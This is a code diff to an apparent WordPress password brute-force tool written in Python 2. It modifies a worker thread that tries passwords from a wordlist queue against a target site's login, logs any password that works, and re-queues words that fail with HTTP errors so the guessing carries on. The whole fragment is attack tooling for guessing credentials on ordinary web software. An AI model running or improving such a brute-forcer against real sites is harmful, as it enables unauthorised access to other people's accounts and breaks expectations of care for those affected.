@@ -38,12 +38,17 @@ class WpbfThread(threading.Thread):
 
     def run(self):
         while self.queue.qsize() > 0:
-            word = self.queue.get()
-            logger.debug("Trying with "+word)
-            if wp.login(config.url, config.username, word, None):
-                logger.info("Password '"+word+"' found for username '"+config.username+"' on "+config.url)
-                self.queue.queue.clear()
-            self.queue.task_done()
+	    try:
+		word = self.queue.get()
+		logger.debug("Trying with "+word)
+		if wp.login(config.url, config.username, word, None):
+		    logger.info("Password '"+word+"' found for username '"+config.username+"' on "+config.url)
+		    self.queue.queue.clear()
+		self.queue.task_done()
+	    except urllib2.HTTPError, e:
+		logger.debug("HTTP Error: "+str(e)+"for: "+word)
+		self.queue.put(word)
+		logger.debug("Requeued: "+word)
 
 if __name__ == '__main__':
     #parse command line arguments
